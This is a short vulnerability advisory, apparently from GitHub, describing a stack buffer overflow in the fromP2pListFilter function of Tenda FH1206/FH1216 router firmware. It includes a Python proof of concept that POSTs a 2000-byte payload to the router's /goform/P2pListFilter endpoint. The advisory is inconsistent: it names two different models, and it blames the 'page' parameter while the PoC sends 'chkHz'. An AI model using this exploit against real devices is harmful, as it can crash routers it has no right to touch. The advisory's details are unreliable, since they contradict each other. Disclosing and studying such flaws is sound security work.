

# fromP2pListFilter

## Overview

- Firmware download website: https://www.tendacn.com/hk/download/detail-2344.html

## Affected version

FH1206 V1.2.0.8(8155)_EN

## Vulnerability details

There is a stack buffer overflow vulnerability in Tenda FH1216 V1.2.0.8(8155)_EN, located in the **fromP2pListFilter** function. The function receives the `page` parameter from a POST request. `   sprintf(v11, "p2p.asp?page=%s", v8);` The statement will cause a buffer overflow. The `page` value provided by the user may exceed the capacity of the `v11` array, thereby triggering this security vulnerability.
![image](https://github.com/user-attachments/assets/12d5091e-8e60-4022-abde-f1d1f718f739)


## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/P2pListFilter"
payload = b"a"*2000

data = {"chkHz": payload}
response = requests.post(url, data=data)
print(response.text)
```
![image](https://github.com/user-attachments/assets/1eccf7f2-38d2-45de-8ba9-cf4e9940563e)
